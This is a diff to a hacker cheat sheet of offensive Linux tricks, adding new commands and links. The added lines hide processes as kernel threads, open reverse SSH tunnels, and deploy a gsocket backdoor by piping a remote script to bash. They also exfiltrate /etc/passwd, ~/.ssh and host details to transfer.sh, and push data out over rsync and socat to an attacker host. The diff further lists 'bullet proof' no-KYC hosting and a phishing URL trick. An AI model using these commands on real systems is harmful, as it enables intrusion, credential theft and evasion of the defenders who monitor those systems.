@@ -12,7 +12,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 1. [Bash](#bash)
    1. [Leave Bash without history](#bash-no-history)
    1. [Hide your commands](#bash-hide-command)
-   1. [Hide your arguments](#bash-hide-arguments)
+   1. [Hide your command line options](#zap)
    1. [Hide a network connection](#bash-hide-connection)
    1. [Hide a process as user](#hide-a-process-user)
    1. [Hide a process as root](#hide-a-process-root)
@@ -41,6 +41,8 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
    1. [File transfer without curl](#burl)
+   2. [File transfer using rsync](#rsync)
+   1. [File transfer to public dump sites](#trans) 
    1. [File transfer using WebDAV](#webdav)
    1. [File transfer to Telegram](#tg) 
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
@@ -145,18 +147,19 @@ PATH=.:$PATH syslogd -T0 10.0.2.1/24
 ```
 In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.
 
-<a id="bash-hide-arguments"></a>
-**1.iii. Hide your arguments**
+<a id="zap"></a>
+**1.iii. Hide your command line options**
 
-Download [zap-args.c](https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.
-
+Use [zapper](https://github.com/hackerschoice/zapper):
 ```sh
-gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
-(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24)
-### Or as daemon background process:
-(LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24 &>nmap.log &)
+# Start Nmap but zap all options and show it as 'klog' in the process list:
+./zapper -a klog nmap -T0 10.0.0.1/24
+# Same but started as a daemon:
+(./zapper -a klog nmap -T0 10.0.0.1/24 &>nmap.log &)
+# Replace the existing shell with tmux (with 'exec').
+# Then start and hide tmux and all further processes - as some kernel process:
+exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux
 ```
-Note: There is a gdb variant as well. Anyone?
 
 <a id="bash-hide-connection"></a>
 **1.iv. Hide a Network Connection**
@@ -345,19 +348,19 @@ The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now con
 On the host behind NAT: Create a reverse SSH tunnel to [ssh-j.com](http://ssh-j.com) like so:
 ```sh
 ## Cut & Paste on the host behind NAT.
-ssh_j()
+sshj()
 {
    local pw
-   pw=$1
+   pw=${1,,}
    [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
    echo "Press Ctrl-C to stop this tunnel."
-   echo -e "To connect to this host: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
+   echo -e "To ssh to ${USER:-root}@${2:-127.0.0.1}:${3:-22} type: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
    ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
 }
 
-ssh_j                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected
-ssh_j foobarblahblub                  # Creates tunnel with specific tunnel ID
-ssh_j foobarblahblub 192.168.0.1 2222 # Tunnel to host 192.168.0.1 on port 2222 on the LAN
+sshj                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected
+sshj foobarblahblub                  # Creates tunnel to 127.0.0.1:22 with specific tunnel ID
+sshj foobarblahblub 192.168.0.1 2222 # Tunnel to host 192.168.0.1:2222 on the LAN
 ```
 
 Then use this command from anywhere else in the world to connect as 'root' to 'foobarblahblub' (the host behind the NAT):
@@ -451,6 +454,8 @@ ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
 ### Or using remote.moe
 ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
 ### Or using cloudflared
+curl -fL -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+chmod 755 cloudflared
 cloudflared tunnel --url http://localhost:8080 --no-autoupdate
 ```
 Either tunnel will generate a new HTTPS-URL for you. Use this URL on your workstation (see below). Use [Gost](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) to tunnel raw TCP over the HTTP(s) link.
@@ -867,9 +872,19 @@ export GSOCKET_ARGS="-s MySecret"                        # Workstation
 sftp -D gs-netcat                                        # Workstation
 ```
 
-<a id="http"></a>
-### 4.v. File transfer - using HTTP
+Or to DUMP a single file:
+```sh
+# On the sender
+gs-netcat -l <"FILENAME" # Will output a SECRET used by the receiver
 
+# On the receiver
+gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
+```
+
+<a id="http"></a>
+### 4.v. File transfer - using HTTPs
+
+#### Download from Server to Receiver:
 ```sh
 ## Spawn a temporary HTTP server and share the current working directory.
 python -m http.server 8080
@@ -878,6 +893,24 @@ python -m http.server 8080
 ```sh
 ## Request a temporary tunnel on a public domain
 cloudflared tunnel -url localhost:8080
+```
+Receiver: Access the URL from any browser to view/download the remote file system.
+
+#### Upload from Sender to Receiver:
+```
+## Spawn an upload server on the Receiver:
+pip install uploadserver
+python -m uploadserver
+```
+
+```sh
+## Make it available through a public domain
+cloudflared tunnel -url localhost:8000
+```
+
+On the Sender:
+```sh
+curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
 ```
 
 <a id="burl"></a>
@@ -896,10 +929,73 @@ burl() {
 # PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
 ```
 
-<a id="webdav"></a>
-### 4.vii. File transfer - using WebDAV
+<a id="trans"></a>
+### 4.vii. File transfer using a public dump
 
-On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
+Cut & paste into your bash:
+```sh
+transfer() {
+    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
+    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1}"; return; }
+    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
+    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
+    curl -SsfL --progress-bar -T "$1" "https://transfer.sh/${1##*/}"
+}
+```
+
+then upload a file or a directory:
+```sh
+transfer /etc/passwd  # A single file
+transfer ~/.ssh       # An entire directory
+(curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
+```
+A list of our [favorite public upload sites](#cloudexfil).
+
+<a id="rsync"></a>
+### 4.viii. File transfer - using rsync
+
+Ideal for synchonizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.
+
+Receiver:
+```
+echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
+mkdir upload
+rsync --daemon --port=31337 --config=r.conf --no-detach
+```
+
+Sender:
+```
+rsync -av warez rsync://1.2.3.4:31337/up
+```
+
+The same encrypted (OpenSSL):
+
+Receiver:
+```
+openssl req -subj '/CN=thc/O=EXFIL/C=XX' -new -newkey rsa:2048 -sha256 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
+cat ssl.key ssl.crt >ssl.pem
+rm -f ssl.key
+mkdir upload
+socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.crt EXEC:"rsync --server -logtprR --safe-links --partial upload"
+```
+
+Sender:
+```
+# Copy the ssl.pem and ssl.crt from the Receiver to the Sender:
+# Using rsync + socat-ssl
+rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.crt,verify=0' #" -- warez  0:
+
+# Using rsync + openssl
+rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername thc -cert ssl.pem -CAfile ssl.crt -quiet 2>/dev/null' #" -- warez  0:
+```
+
+This can be combined with cloudflared to exfil with [rsync over https / cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
+(To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).
+
+<a id="webdav"></a>
+### 4.ix. File transfer - using WebDAV
+
+On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
 cloudflared tunnel --url localhost:8080 &
 # [...]
@@ -934,7 +1030,7 @@ net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
 <a id="tg"></a>
-### 4.viii. File transfer to Telegram
+### 4.x. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
 ```sh
@@ -1130,6 +1226,11 @@ bash -c "$(curl -fsSLk https://gsocket.io/x)"
 or
 ```sh
 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
+```
+
+or deploy gsocket by running their own deployment server:
+```sh
+LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/xs)"  # Notice '/xs' instead of '/x'
 ```
 
 <a id="backdoor-background-reverse-shell"></a>
@@ -1488,8 +1589,9 @@ Trusted VPN Providers
 
 Virtual Private Servers
 1. https://www.hetzner.com - Cheap
+2. https://hivecloud.pw - No KYC. Bullet Proof. Accepts Crypto.
 1. https://dmzhost.co - Ignore most abuse requests
-2. https://alexhost.com - DMCA free zone
+2. https://alexhost.com - No KYC. Bullet Proof. DMCA free zone
 3. https://basehost.eu - Ignores court orders
 4. https://buyvm.net - Warez best friend
 5. https://serverius.net - Used by gangsters
@@ -1599,6 +1701,7 @@ Static Binaries / Warez
 
 Phishing
 1. https://github.com/htr-tech/zphisher - We don't hack like this but this is what we would use.
+2. https://da.gd/ - Tinier TinyUrl and allows https://www.google.com-fish-fish@da.gd/blah
 
 Tools
 1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
@@ -1634,7 +1737,6 @@ Publishing
 
 Forums and Conferences
 1. [0x00Sec](https://0x00sec.org/) - Reverse Engineering & Hacking with a pinch of Malware
-2. [CyberArsenal](https://cyberarsenal.org/)/[Telegram](https://t.me/pwn3rzs) - Hacker Warez, tools and programs
 3. [AlligatorCon](https://www.alligatorcon.eu/) - the original
 4. [0x41con](https://0x41con.org/)
 5. [TumpiCon](https://tumpicon.org/)
@@ -1699,6 +1801,7 @@ rlwrap --always-readline ssh user@host
 <a id="others"></a>
 ## 13. Other Sites
 
+1. [Phineas Fisher](https://blog.isosceles.com/phineas-fisher-hacktivism-and-magic-tricks/) - No nonsense. Direct. How we like it.
 1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
 2. [Guacamaya Hackback](https://www.youtube.com/watch?v=5vRIisM0Op4)
 3. [Vx Underground](https://www.vx-underground.org/)
